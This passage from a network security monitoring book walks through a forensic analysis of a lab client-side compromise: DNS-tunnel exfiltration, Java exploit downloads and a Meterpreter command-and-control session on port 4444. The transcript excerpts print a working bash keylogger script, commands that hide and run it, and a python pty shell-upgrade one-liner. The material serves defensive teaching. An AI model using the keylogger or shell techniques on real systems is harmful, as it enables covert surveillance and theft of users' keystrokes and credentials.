<p class="calibre1">1363444959.826628       FVaYW5ltbNh     10.0.0.99       34482   203.0.113.8     53      udp 53252   0iiafy\xf7\xdf\xdbw\xfa\xe3\xe1w\xe7u5\xd5auz\xbf\xe3\xd6\xe6\xd0\xf4u\xc0a\xe4\ xc3l\xdf\xe6\xe1\xf6\xe1\xe1\xbf\xf62c\xd6\xe6d\xe8\xcf\xe2m\xc4\xe3\xe8\xeeru\xe68\xcd\ xc8\xf4j.\xea\xf9ujb\xdau\xc0\xda\xf3\xef\xeb\xc5\xf9\xc4p\xbe\xee\xf6\xc1awd\xfc\xf2\xc5\ xd0\xfd\xf1\xc0f\xc5r\xe0\xc9\xecm\xdd\xd2\xe2l\xf0\xd8\xfc\xd8ct5\xc6\xfdt\xcce\xec\xf7z\ xea.z\xe5m\xfbr\xe9\xbe\xd2\xe7\xfd\xe3\xc6cu\xc2wtz\xeb\xe1uqk\xbf\xf2\xcb4\xe6v1w\xcei\xd8\ xca\xc8hmsg4qjzhkd\xe0u\xe4\xfa\xc7nitlk.\xbc\xeb\xdec\xe1\xc8l31yiz\xfd\xd1\xf8\xfdro\xd0\ xef3p\xccoql\xd9\xdb\xc5\xedt\xc2\xc1\xd5\xf2m\xfcq\xebm\xc2\xc8f\xf9x\xf8xikc\xc3wu\xdfcc. </p>
<p class="calibre1">practicalnsm.com 1       C_INTERNET      10      NULLu    -       -       F       F       T       </p>
<p class="calibre1">F       0       -       -</p>
<p class="calibre1">1363445003.696798       FVaYW5ltbNh     10.0.0.99       34482   203.0.113.8     53      udp 45003   0akazvdidx3\xf1bv\xf078w\xe20\xfd\xd0i\xc1\xe7d\xe2\xc5\xcd\xe3\xda7\xe0\xf9\xbf9\ xfdk\xefrxcn\xd5\xebue\xc6\xed\xbc\xc5b\xe2\xcc\xda\xd0\xc3\xe2\xbdij8.\xdf\xf3\xfa\xefy\xfd\ xc8yhm\xbe\xf77l\xc8\xdc\xe3\xe0\xca\xdeo\xc0\xf3\xcbam\xd1\xd2\xfdt\xd1i\xd7r\xea\xcbc3\xdc\ xee\xe5\xe04o\xd9\xce\xec8n\xf99w\xd8\xfcjnw.\xf2j\xe4\xf5\xf6\xeb\xc60\xf3hv\xf9\xc38s\xef\ xd5b\xe4\xc6\xc9\xc9g\xd38\xfbhy\xf5\xccxw\xc7\xd0a2ypsz\xca\xe3\xbd\xc8\xbd\xc6cy\xd2\xce\ xbf\xe0b\xd8\xc4\xc6i.cb1\xf4fqp\xce\xd4\xebb\xe9v\xfdk\xed\xc3\xce\xcf\xe5j\xf9u\xf4uyn\ xed\xe3o\xf6l\xd7zyrp\xf2\xfd5swrz\xe8\xe6\xd5\xe2\xd3iv\xf2m\xd2\xe9\xdb.practicalnsm.com 1       C_INTERNET      10      NULLu    -       -       F       F       T       F       0       </p>
<p class="calibre1">-       -</p>
<p class="calibre1"> <i class="calibre4">Listing 11-4: Malicious entries in the Bro </i> dns .log <i class="calibre4"> file</i></p>
<p class="calibre1">It looks as if someone is transporting data within hostnames in the </p>
<p class="calibre1"> <i class="calibre4">practicalnsm.com</i> domain. This appears to be a form of covert channel—an </p>
<p class="calibre1">intruder is sending content via DNS records. </p>
<p class="calibre1">The technique we’re observing is popular when defenders keep tight </p>
<p class="calibre1">access controls on outbound traffic. If an attacker can query name servers, </p>
<p class="calibre1">he can send data packaged as part of the hostnames he queries via DNS. </p>
<p class="calibre1">(This is a low-bandwidth attack method because a limited number of bytes </p>
<p class="calibre1">can be carried in a hostname. In fact, more than 65,000 DNS records in </p>
<p class="calibre1">this particular Bro  <i class="calibre4">dns.log</i> file are associated with this sort of activity.)</p>
<p class="calibre1"><b class="calibre3">checking destination Ports</b></p>
<p class="calibre1">So far, we’ve recognized that four IP addresses are involved in this particular </p>
<p class="calibre1">intrusion. Two belong to Vivian’s Pets: 172.16.0.37 (in the wireless network), </p>
<p class="calibre1">and 10.0.0.99 (in the internal network). Two belong to the intruder and sit </p>
<p class="calibre1">on the Internet: 203.0.113.15 and 203.0.113.8. Figure 11-11 shows the posi-</p>
<p class="calibre1">tions of these IP addresses on the network. </p>
<p class="calibre1"><b class="calibre3">246</b>   Chapter 11</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p281"/><img src="index-281_1.png" alt="Image 140" class="calibre2"/></p>
<p class="calibre1">Intruder 1</p>
<p class="calibre1">Internet</p>
<p class="calibre1">203.0.113.15</p>
<p class="calibre1">Intruder 2</p>
<p class="calibre1">203.0.113.8</p>
<p class="calibre1">Tap</p>
<p class="calibre1">Wireless</p>
<p class="calibre1">Network</p>
<p class="calibre1">Tap</p>
<p class="calibre1">NSM</p>
<p class="calibre1">Laptop</p>
<p class="calibre1">Internal</p>
<p class="calibre1">172.16.0.37</p>
<p class="calibre1">Network</p>
<p class="calibre1">Desktop</p>
<p class="calibre1">10.0.0.99</p>
<p class="calibre1"> <i class="calibre4">Figure 11-11: Participants in the intrusion</i></p>
<p class="calibre1">We decide to take another look at traffic involving 203.0.113.115, this </p>
<p class="calibre1">time by querying ELSA for records and group by dstport (destination port). </p>
<p class="calibre1">The results are shown in Figure 11-12. </p>
<p class="calibre1"> <i class="calibre4">Figure 11-12: ELSA displays a summary  </i></p>
<p class="calibre1"> <i class="calibre4">of dstport entries for 203.0.113.15. </i></p>
<p class="calibre1">Client-side Compromise   <b class="calibre3">247</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p282"/><img src="index-282_1.png" alt="Image 141" class="calibre2"/></p>
<p class="calibre1"><img src="index-282_2.png" alt="Image 142" class="calibre2"/></p>
<p class="calibre1">Records with 54056 as the destination port are associated with the </p>
<p class="calibre1">Metasploit Meterpreter activity noted earlier. There is only one type of mes-</p>
<p class="calibre1">sage for this activity; they are all Snort alerts, as shown in Figure 11-13. </p>
<p class="calibre1"> <i class="calibre4">Figure 11-13: ELSA displays a summary of Snort signatures for  </i></p>
<p class="calibre1"> <i class="calibre4">203.0.113.15 and dstport 54056. </i></p>
<p class="calibre1">Turning to destination port 4444, we use a similar process with similar </p>
<p class="calibre1">results. Figure 11-14 shows what ELSA returns when we examine records </p>
<p class="calibre1">where port 4444 is the destination port and 203.0.113.15 is an IP address. </p>
<p class="calibre1"> <i class="calibre4">Figure 11-14: ELSA displays a summary of Snort signatures for  </i></p>
<p class="calibre1"> <i class="calibre4">203.0.113.15 and dstport 4444. </i></p>
<p class="calibre1">It’s important to realize that these two destination ports are actually </p>
<p class="calibre1">artifacts of packets being exchanged between the computers at 203.0.113.15 </p>
<p class="calibre1">and 172.16.0.37. It may be difficult to recognize this because ELSA is sum-</p>
<p class="calibre1">marizing information captured in Snort alerts and other formats. However, </p>
<p class="calibre1">a quick check of the Argus session data makes it easy to understand this </p>
<p class="calibre1">important connection, as shown in Listing 11-5. </p>
<p class="calibre1">$ <b class="calibre3">racluster -n -r /nsm/sensor_data/sovm-eth1/argus/2013-03-16.log - host 203.0.113.15</b></p>
<p class="calibre1">StartTime      Flgs  Proto            SrcAddr  Sport   Dir            DstAddr  Dport  </p>
<p class="calibre1">TotPkts   TotBytes State</p>
<p class="calibre1">14:16:48.724146  e           tcp        172.16.0.37.60320     -&gt;       203.0.113.15.8080u 19       3360   FIN</p>
<p class="calibre1">14:16:52.544555  e           tcp        172.16.0.37.60321     -&gt;       203.0.113.15.8080v 13       1790   FIN</p>
<p class="calibre1">14:16:52.735852  e           tcp        172.16.0.37.60322     -&gt;       203.0.113.15.8080w 27      16164   FIN</p>
<p class="calibre1">14:16:53.371660  e           tcp        172.16.0.37.54056     -&gt;       203.0.113.15.4444x 2802   834486   FIN</p>
<p class="calibre1"> <i class="calibre4">Listing 11-5: Argus records for sessions involving 203.0.113.15</i></p>
<p class="calibre1"><b class="calibre3">248</b>   Chapter 11</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p283"/>This record shows that 172.16.0.37 connected to 203.0.113.15 four times, as shown in the four sessions. The first three sessions connected to port 8080 </p>
<p class="calibre1">TCP at u, v, and w. The last session connected to port 4444 TCP x. </p>
<p class="calibre1">We can examine these conversations via the full content data as well, </p>
<p class="calibre1">and use Tshark to pay attention to the HTTP traffic to port 8080 TCP. </p>
<p class="calibre1">Listing 11-6 shows that activity. </p>
<p class="calibre1">$ <b class="calibre3">tshark -t ad -n -r /nsm/sensor_data/sovm-eth1/dailylogs/2013-03-16/snort </b></p>
<p class="calibre1"><b class="calibre3">.log.1363441666 -R 'tcp.port==8080 and http' </b></p>
<p class="calibre1">2910 2013-03-16 14:16:48.727696  172.16.0.37 -&gt; 203.0.113.15 HTTP 373</p>
<p class="calibre1">GET /healthcarenews HTTP/1.1</p>
<p class="calibre1">2912 2013-03-16 14:16:48.729359 203.0.113.15 -&gt; 172.16.0.37  HTTP 200</p>
<p class="calibre1">HTTP/1.1 302 Moved</p>
<p class="calibre1">2914 2013-03-16 14:16:48.746910  172.16.0.37 -&gt; 203.0.113.15 HTTP 374</p>
<p class="calibre1">GET /healthcarenews/ HTTP/1.1</p>
<p class="calibre1">2915 2013-03-16 14:16:48.752649 203.0.113.15 -&gt; 172.16.0.37  HTTP 291</p>
<p class="calibre1">HTTP/1.1 200 OK  (text/html)</p>
<p class="calibre1">2917 2013-03-16 14:16:48.897487  172.16.0.37 -&gt; 203.0.113.15 HTTP 340</p>
<p class="calibre1">GET /favicon.ico HTTP/1.1</p>
<p class="calibre1">2918 2013-03-16 14:16:48.899164 203.0.113.15 -&gt; 172.16.0.37  HTTP 335</p>
<p class="calibre1">HTTP/1.1 404 File not found  (text/html)</p>
<p class="calibre1">2920 2013-03-16 14:16:48.905587  172.16.0.37 -&gt; 203.0.113.15 HTTP 370</p>
<p class="calibre1">GET /favicon.ico HTTP/1.1</p>
<p class="calibre1">2921 2013-03-16 14:16:48.908271 203.0.113.15 -&gt; 172.16.0.37  HTTP 335</p>
<p class="calibre1">HTTP/1.1 404 File not found  (text/html)</p>
<p class="calibre1">2926 2013-03-16 14:16:52.560069  172.16.0.37 -&gt; 203.0.113.15 HTTP 415</p>
<p class="calibre1">GET /healthcarenews/Exploit.jar.pack.gzu HTTP/1.1</p>
<p class="calibre1">2928 2013-03-16 14:16:52.719387 203.0.113.15 -&gt; 172.16.0.37  HTTP 200</p>
<p class="calibre1">HTTP/1.1 302 Moved</p>
<p class="calibre1">2930 2013-03-16 14:16:52.722747  172.16.0.37 -&gt; 203.0.113.15 HTTP 274</p>
<p class="calibre1">GET /healthcarenews/ HTTP/1.1</p>
<p class="calibre1">2932 2013-03-16 14:16:52.725372 203.0.113.15 -&gt; 172.16.0.37  HTTP 291</p>
<p class="calibre1">HTTP/1.1 200 OKx (text/html) </p>
<p class="calibre1">2939 2013-03-16 14:16:52.738151  172.16.0.37 -&gt; 203.0.113.15 HTTP 364</p>
<p class="calibre1">GET /healthcarenews/Exploit.jarv HTTP/1.1</p>
<p class="calibre1">2945 2013-03-16 14:16:53.022853 203.0.113.15 -&gt; 172.16.0.37  HTTP 1138</p>
<p class="calibre1">HTTP/1.1 200 OKy (application/octet-stream)</p>
<p class="calibre1">2951 2013-03-16 14:16:53.037218  172.16.0.37 -&gt; 203.0.113.15 HTTP 406</p>
<p class="calibre1">GET /healthcarenews/Exploit.jarw HTTP/1.1</p>
<p class="calibre1">2957 2013-03-16 14:16:53.056665 203.0.113.15 -&gt; 172.16.0.37  HTTP 1138</p>
<p class="calibre1">HTTP/1.1 200 OKz (application/octet-stream)</p>
<p class="calibre1"> <i class="calibre4">Listing 11-6: HTTP traffic from 172.16.0.37 to 203.0.113.15</i></p>
<p class="calibre1">Listing 11-6 contains several troublesome entries. Requests for  <i class="calibre4">Exploit </i></p>
<p class="calibre1"> <i class="calibre4">.jar .pack.gz</i> at u and  <i class="calibre4">Exploit.jar</i> v w indicate the intruder’s code on the victim system is trying to retrieve additional software from the attacking system. The </p>
<p class="calibre1">initial code running on the victim is a beachhead, and now it’s calling back </p>
<p class="calibre1">home for reinforcements. Unfortunately for the victim, those packages are </p>
<p class="calibre1">available and served upon order, as shown by the 200 OK responses x y z. </p>
<p class="calibre1">This is another way to view activity that started the intrusion. However, </p>
<p class="calibre1">we still need to know what happened after the attack succeeded. </p>
<p class="calibre1">Client-side Compromise   <b class="calibre3">249</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p284"/><img src="index-284_1.png" alt="Image 143" class="calibre2"/></p>
<p class="calibre1"><b class="calibre3">examining the command-and-control channel</b></p>
<p class="calibre1">From our previous analysis, we know that the intruder pivoted from victim </p>
<p class="calibre1">172.16.0.37 to 10.0.0.99, but we don’t know what he did on those two systems. </p>
<p class="calibre1">Perhaps the traffic involving port 4444 TCP holds the answer. This could </p>
<p class="calibre1">be the command-and-control channel, because it appears immediately after </p>
<p class="calibre1">the connections to the malicious website. </p>
<p class="calibre1">To analyze the suspected command-and-control channel, we generate </p>
<p class="calibre1">a transcript for port 4444 traffic using the CapMe feature in ELSA. Click </p>
<p class="calibre1">the <b class="calibre3">Info</b> button next to the record of interest involving port 4444 to get full content data. Figure 11-15 shows how to access CapMe. </p>
<p class="calibre1"> <i class="calibre4">Figure 11-15: Starting CapMe to generate a transcript for port 4444 traffic</i></p>
<p class="calibre1">Click the <b class="calibre3">getPcap</b> option, and then click <b class="calibre3">OK</b>, to display a new screen </p>
<p class="calibre1">where we input credentials to access the sensor. Also, for this example, I </p>
<p class="calibre1">needed to change the Sid Source entry from <b class="calibre3">sancp</b> to <b class="calibre3">event</b> to help CapMe find the right session. When I ran this query originally, CapMe did not find </p>
<p class="calibre1">the session with the Sid Source as sancp. The session record was probably </p>
<p class="calibre1">not loaded yet, so I used the event table to find the data of interest. This </p>
<p class="calibre1">approach works only if there is an event (triggered by Snort or Suricata, </p>
<p class="calibre1">for example) associated with the traffic. It’s safer to use the sancp table </p>
<p class="calibre1">as long as the records have been loaded. You may need to wait a few min-</p>
<p class="calibre1">utes for the records to load. Figure 11-16 shows the CapMe data request </p>
<p class="calibre1">interface. </p>
<p class="calibre1">In this section, we will examine the resulting transcript. At 642KB, it’s </p>
<p class="calibre1">quite large, and manually examining it for entries of interest is tedious, </p>
<p class="calibre1">but doing so is our best way to determine what happened to the victim </p>
<p class="calibre1">systems. We’ll look at excerpts from the transcript and what is happening </p>
<p class="calibre1">at each point. </p>
<p class="calibre1"><b class="calibre3">250</b>   Chapter 11</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p285"/><img src="index-285_1.jpg" alt="Image 144" class="calibre2"/></p>
<p class="calibre1"> <i class="calibre4">Figure 11-16: Configuring CapMe to retrieve a transcript for </i></p>
<p class="calibre1"> <i class="calibre4">port 4444 traffic</i></p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">Initial Access</b></i></p>
<p class="calibre1">The transcript begins with the standard header created by Sguil (which </p>
<p class="calibre1">handles transcript creation for CapMe, in the background) as shown in </p>
<p class="calibre1">Listing 11-7. The command-and-control channel is not a cleartext-based </p>
<p class="calibre1">exchange as in previous examples, so be prepared for a lot of extraneous </p>
<p class="calibre1">characters! </p>
<p class="calibre1">Sensor Name:    sovm-eth1-1</p>
<p class="calibre1">Timestamp:      2013-03-16 14:17:57</p>
<p class="calibre1">Connection ID:  .sovm-eth1-1_210</p>
<p class="calibre1">Src IP:         172.16.0.37     (Unknown)</p>
<p class="calibre1">Dst IP:         203.0.113.15    (Unknown)</p>
<p class="calibre1">Src Port:               54056</p>
<p class="calibre1">Dst Port:               4444</p>
<p class="calibre1">OS Fingerprint: 172.16.0.37:54056 - UNKNOWN [S10:64:1:60:M1460,S,T,N,W6:.:?:?] (up: 4 hrs) OS Fingerprint:   -&gt; 203.0.113.15:4444 (link: ethernet/modem)</p>
<p class="calibre1">DST: ...........-. </p>
<p class="calibre1">DST: .........start..E(Ljava/io/DataInputStream;Ljava/io/OutputStream;[Ljava/lang/String;)V.. </p>
<p class="calibre1"> <i class="calibre4">Listing 11-7: Standard transcript header created by Sguil</i></p>
<p class="calibre1">Next, the term meterpreter appears, as shown in Listing 11-8. We’ve already </p>
<p class="calibre1">seen this in the Snort alerts, but the presence of the term here indicates we’re </p>
<p class="calibre1">dealing with a Meterpreter component of the Metasploit framework. </p>
<p class="calibre1">Client-side Compromise   <b class="calibre3">251</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p286"/>DST: java/util/Map.......7com/metasploit/<b class="calibre3">meterpreter</b>/MemoryBufferURLStreamHandler............. </p>
<p class="calibre1">getFiles...java/lang/Class........java/lang/Object..... </p>
<p class="calibre1"> <i class="calibre4">Listing 11-8: The meterpreter reference</i></p>
<p class="calibre1">As shown in Listing 11-9, next we see the term sysinfo, followed by </p>
<p class="calibre1">what might be a hostname, wirubu32, and a Linux kernel version, Linux </p>
<p class="calibre1">3.5.0-25-generic (i386). The victim system appears to be a Linux i386 </p>
<p class="calibre1">platform. </p>
<p class="calibre1">SRC: .........."....stdapi_sys_config_<b class="calibre3">sysinfo</b>....)....53495413969516947426070095319226......... </p>
<p class="calibre1"><b class="calibre3">wirubu32</b>....&amp;.... <b class="calibre3">Linux 3.5.0-25-generic (i386)</b>............. </p>
<p class="calibre1">DST:</p>
<p class="calibre1"> <i class="calibre4">Listing 11-9: System information</i></p>
<p class="calibre1">Next, we see the term desktop_screenshot, as shown in Listing 11-10, </p>
<p class="calibre1">which is certainly suspicious. This is probably a command to acquire a </p>
<p class="calibre1">screen capture of the victim’s desktop. </p>
<p class="calibre1">..Ji.......%....stdapi_ui_<b class="calibre3">desktop_screenshot</b>....)....53921668623768997177532920965755.......... </p>
<p class="calibre1">..2..I. .....j.x...}|T..0|&amp;s..0..t.AS.u.`.F..I'..2.Q&amp;..k&amp;..`.4M)R.AZ'.....v.i.Gm...../</p>
<p class="calibre1">[...V..@...@.Q...WO..X.......g...{.{..{.ym..g.}.^{. </p>
<p class="calibre1"> <i class="calibre4">Listing 11-10: The desktop_screenshot command for getting screen captures</i></p>
<p class="calibre1">This second appearance of a desktop_screenshot command is followed </p>
<p class="calibre1">by a JFIF string, as shown in Listing 11-11. This is probably the header for </p>
<p class="calibre1">a JPEG File Interchange Format ( JFIF) file. </p>
<p class="calibre1">SRC: ..........%....stdapi_ui_<b class="calibre3">desktop_screenshot</b>....)....53921668623768997177532920965755.. </p>
<p class="calibre1">..w.......... <b class="calibre3">JFIF</b>.............C...... </p>
<p class="calibre1"> <i class="calibre4">Listing 11-11: JFIF reference</i></p>
<p class="calibre1">The excerpt in Listing 11-12 shows the net_config_get_interfaces and </p>
<p class="calibre1">net_config_get_routes functions. The intruder is probably listing network </p>
<p class="calibre1">interfaces and routes on the victim system to see where he sits on the </p>
<p class="calibre1">network. </p>
<p class="calibre1">DST: ...Z.......)....stdapi_net_config_get_interfaces....)....90005067652712330016895656875088. </p>
<p class="calibre1">SRC: . </p>
<p class="calibre1">SRC: ..j.......)....stdapi_<b class="calibre3">net_config_get_interfaces</b>....)....90005067652712330016895656875088.. </p>
<p class="calibre1">...............@..........|...........z....................eth0 - </p>
<p class="calibre1">eth0...................)..8.............@.......................%........... </p>
<p class="calibre1">.....@..........|...........z..@4................lo - lo....................................... </p>
<p class="calibre1">.................................. </p>
<p class="calibre1">DST: ...V.......%....stdapi_net_config_get_routes....)....34295947967733618834188710122897. </p>
<p class="calibre1"><b class="calibre3">252</b>   Chapter 11</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p287"/>SRC: . </p>
<p class="calibre1">SRC: ..Z.......%....stdapi_<b class="calibre3">net_config_get_routes</b>....)....34295947967733618834188710122897..... </p>
<p class="calibre1">...........P@.....................)..8.....................................................,@</p>
<p class="calibre1">.............. </p>
<p class="calibre1"> <i class="calibre4">Listing 11-12: The net_config_get_interfaces and net_config_get_routes functions</i></p>
<p class="calibre1">The getwd command in Listing 11-13 probably means to get the working </p>
<p class="calibre1">directory, followed by a mention of the  <i class="calibre4">/home/ubu32</i> directory. </p>
<p class="calibre1">%...........................P@...... </p>
<p class="calibre1">........................................................................,@..................... </p>
<p class="calibre1">.................. </p>
<p class="calibre1">DST: ...I............stdapi_fs_<b class="calibre3">getwd</b>....)....55282344159994215019998291531526. </p>
<p class="calibre1">SRC: . </p>
<p class="calibre1">SRC: ..i............stdapi_fs_getwd....)....55282344159994215019998291531526......... <b class="calibre3">/home/</b></p>
<p class="calibre1"><b class="calibre3">ubu32</b>............. </p>
<p class="calibre1"> <i class="calibre4">Listing 11-13: The getwd command and </i>/home/ubu32 <i class="calibre4"> reference</i></p>
<p class="calibre1">Listing 11-14 shows the most interesting entry so far. The string keylog </p>
<p class="calibre1">.sh indicates that a keylogger is involved. If the intruder can capture keystrokes </p>
<p class="calibre1">on the victim, he can access all sorts of information and potentially other </p>
<p class="calibre1">systems. Following the name of the script appears to be the script itself, as </p>
<p class="calibre1">well as the name of the file used to save the logged keystrokes:  <i class="calibre4">/tmp/.xkey.log</i>. </p>
<p class="calibre1">With this information, we could look for the file on the victim hard drive, </p>
<p class="calibre1">assuming the intruder didn’t delete it or the system didn’t remove it after </p>
<p class="calibre1">rebooting. </p>
<p class="calibre1">DST: ................core_channel_open....)....64467327797845790259721795802753........3std api_fs_file........6........................ <b class="calibre3">keylog.sh</b>.........wbb. </p>
<p class="calibre1">SRC: . </p>
<p class="calibre1">SRC: ..c............core_channel_open....)....64467327797845790259721795802753........2....... </p>
<p class="calibre1">......... </p>
<p class="calibre1">DST: ................core_channel_write....)....05544054210663822153934887650143........2..... </p>
<p class="calibre1">..X...4#!/bin/bash</p>
<p class="calibre1">DST: export DISPLAY=:0.0</p>
<p class="calibre1">DST: xinput list</p>
<p class="calibre1">DST: echo -e "KBD ID ?" </p>
<p class="calibre1">DST: read kbd</p>
<p class="calibre1">DST: xmodmap -pke &gt; <b class="calibre3">/tmp/.xkey.log</b></p>
<p class="calibre1">DST: script -c "xinput test $kbd" | cat &gt;&gt; /<b class="calibre3">tmp/.xkey.log</b> &amp; DST: echo "The keylog can be downloaded from <b class="calibre3">/tmp/.xkey.log</b>" </p>
<p class="calibre1">DST: echo "Use the meterpreter download function" </p>
<p class="calibre1">DST: echo "Press CTLR+C to exit this session, <b class="calibre3">keylogger will run in background</b>" </p>
<p class="calibre1"> <i class="calibre4">Listing 11-14: Keylogger references</i></p>
<p class="calibre1">The intruder appears to run an ls -al command next. (Listing 11-15 </p>
<p class="calibre1">shows only part of the output, although all of it was present in the transcript.)</p>
<p class="calibre1">Client-side Compromise   <b class="calibre3">253</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p288"/>DST: ...s............core_channel_write....)....27069574503151630704223424155348........2...... </p>
<p class="calibre1">.....4<b class="calibre3">ls -al</b></p>
<p class="calibre1"><b class="calibre3">DST:</b> ............ </p>
<p class="calibre1">SRC: . </p>
<p class="calibre1">SRC: ..d............core_channel_write....)....27069574503151630704223424155348............... </p>
<p class="calibre1">.......... </p>
<p class="calibre1">SRC: . </p>
<p class="calibre1">SRC: ..............2.......W...4total 164</p>
<p class="calibre1">SRC: drwxr-xr-x 24 ubu32 ubu32 4096 Mar 16 10:22 . </p>
<p class="calibre1">SRC: drwxr-xr-x  3 root  root  4096 Mar  8 21:00 .. </p>
<p class="calibre1">SRC: -rw-------  1 ubu32 ubu32 4447 Mar 16 08:17 .bash_history</p>
<p class="calibre1">SRC: -rw-r--r--  1 ubu32 ubu32  220 Mar  8 21:00 .bash_logout</p>
<p class="calibre1">SRC: -rw-r--r--  1 ubu32 ubu32 3486 Mar  8 21:00 .bashrc</p>
<p class="calibre1">SRC: drwx------ 15 ubu32 ubu32 4096 Mar 16 06:29 .cache</p>
<p class="calibre1">SRC: drwxrwxr-x  3 ubu32 ubu32 4096 Mar 15 08:52 .compiz-1</p>
<p class="calibre1">SRC: drwx------ 11 ubu32 ubu32 4096 Mar 16 09:34 .config</p>
<p class="calibre1">SRC: drwx------  3 ubu32 ubu32 4096 Mar  8 21:34 .dbus</p>
<p class="calibre1">SRC: drwxr-xr-x  2 ubu32 ubu32 4096 Mar  8 21:34 Desktop</p>
<p class="calibre1">SRC: -rw-r--r--  1 ubu32 ubu32   26 Mar 16 09:08 .dmrc</p>
<p class="calibre1">SRC: drwxr-xr-x  2 ubu32 ubu32 4096 Mar  8 21:34 Documents</p>
<p class="calibre1"> <i class="calibre4">Listing 11-15: An ls -al command</i></p>
<p class="calibre1">The next command, mv keylog.sh .pulse, shows the intruder moving his </p>
<p class="calibre1">keylogger script into the  <i class="calibre4">.pulse</i> directory, as shown in Listing 11-16. Next, he changes the user permissions to rwx, for read-write-execute. </p>
<p class="calibre1">DST: ................core_channel_write....)....64553530986314682019983298603129........2...... </p>
<p class="calibre1">.....4<b class="calibre3">mv keylog.sh .pulse</b></p>
<p class="calibre1">DST: ................core_channel_write....)....60405588103478885840826252268236........2...... </p>
<p class="calibre1">.....4chmod u=<b class="calibre3">rwx</b> keylog.sh</p>
<p class="calibre1">DST: ............ </p>
<p class="calibre1">SRC: . </p>
<p class="calibre1">SRC: ..d............core_channel_write....)....60405588103478885840826252268236............... </p>
<p class="calibre1">.......... </p>
<p class="calibre1"> <i class="calibre4">Listing 11-16: The mv keylog.sh .pulse command and rxw permissions</i></p>
<p class="calibre1">Here, the intruder appears to execute his  <i class="calibre4">keylog.sh</i> script. (The output of </p>
<p class="calibre1">the script follows in Listing 11-17.) This script gives the intruder a chance to </p>
<p class="calibre1">select the keyboard to monitor and reminds him to look in the  <i class="calibre4">/tmp/.xkey.log</i> </p>
<p class="calibre1">directory for results. </p>
<p class="calibre1">DST: ...x............core_channel_write....)....75957044127671614064150081298305........2...... </p>
<p class="calibre1">.....4. <b class="calibre3">/keylog.sh</b></p>
<p class="calibre1">DST: ............ </p>
<p class="calibre1">SRC: . </p>
<p class="calibre1">SRC: ..d............core_channel_write....)....75957044127671614064150081298305............... </p>
<p class="calibre1">.......... </p>
<p class="calibre1">SRC: . </p>
<p class="calibre1">SRC: ..............2...........4... Virtual core pointer                    .id=2.[master pointer  (3)]</p>
<p class="calibre1"><b class="calibre3">254</b>   Chapter 11</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p289"/>SRC: ...   ... Virtual core XTEST pointer              .id=4.[slave  pointer  (2)]</p>
<p class="calibre1">SRC: ...   ... VMware VMware Virtual USB Mouse         .id=7.[slave  pointer  (2)]</p>
<p class="calibre1">SRC: ...   ... VMware VMware Virtual USB Mouse         .id=8.[slave  pointer  (2)]</p>
<p class="calibre1">SRC: ...   ... ImPS/2 Generic Wheel Mouse              .id=10.[slave  pointer  (2)]</p>
<p class="calibre1">SRC: ... Virtual core keyboard                   .id=3.[master keyboard (2)]</p>
<p class="calibre1">SRC:     ... Virtual core XTEST keyboard             .id=5.[slave  keyboard (3)]</p>
<p class="calibre1">SRC:     ... Power Button                            .id=6.[slave  keyboard (3)]</p>
<p class="calibre1">SRC:     ... AT Translated Set 2 keyboard            .id=9.[slave  keyboard (3)]</p>
<p class="calibre1">SRC: ....................core_channel_write....)....SRREVPPXSOANPPYWFQHSVCNMFFBJBMMJ....u...... </p>
<p class="calibre1">.....2...........4KBD ID ? </p>
<p class="calibre1">SRC: ....................core_channel_write....)....NBVSIORNAUEQNTEQFFFCJMHXSAEMNQNA. </p>
<p class="calibre1">DST: ...n............core_channel_write....)....45042497071271683260243072775318........2..... </p>
<p class="calibre1">.. </p>
<p class="calibre1">DST: ...49</p>
<p class="calibre1">DST: ............ </p>
<p class="calibre1">SRC: . </p>
<p class="calibre1">SRC: ..d............core_channel_write....)....45042497071271683260243072775318............... </p>
<p class="calibre1">.......... </p>
<p class="calibre1">SRC: . </p>
<p class="calibre1">SRC: ..............2...........4<b class="calibre3">The keylog can be downloaded from /tmp/.xkey.log</b></p>
<p class="calibre1">SRC: Use the meterpreter download function</p>
<p class="calibre1">SRC: Press CTLR+C to exit this session, keylogger will run in backround</p>
<p class="calibre1"> <i class="calibre4">Listing 11-17: The </i> keylog .sh <i class="calibre4"> script and reminder</i></p>
<p class="calibre1">Next, we see evidence that the intruder transferred a file called </p>
<p class="calibre1"> <i class="calibre4">iodine_0.6.0~rc1-7_i386.deb</i> from 203.0.113.15 to 172.16.0.37, as shown in </p>
<p class="calibre1">Listing 11-18. This appears to be a Debian package of the Iodine covert </p>
<p class="calibre1">DNS tunnel tool. The intruder must have used this tool to create the tens </p>
<p class="calibre1">of thousands of unusual DNS entries discussed earlier. </p>
<p class="calibre1">DST: ................core_channel_open....)....32392496134731212115385138997235........3std api_fs_file........6...................$.... <b class="calibre3">iodine_0.6.0~rc1-7_i386.deb</b>.........wbb. </p>
<p class="calibre1"> <i class="calibre4">Listing 11-18: The </i> iodine_0 .6 .0~rc1-7_i386 .deb <i class="calibre4"> reference</i></p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">Improving the Shell</b></i></p>
<p class="calibre1">The next command is fascinating, as shown in Listing 11-19. By running </p>
<p class="calibre1">python -c 'import pty;pty.spawn("/bin/bash")', the intruder improves the shell he is using on the victim system by starting a Bash shell. By using Python </p>
<p class="calibre1">to start a Bash shell, he creates a shell that can prompt the user and accept </p>
<p class="calibre1">replies. (When an intruder opens a shell with Meterpreter, he may not have </p>
<p class="calibre1">access that allows him to enter passwords when prompted. This is a problem </p>
<p class="calibre1">when trying to run sudo or answer any other command that prompts the user.)</p>
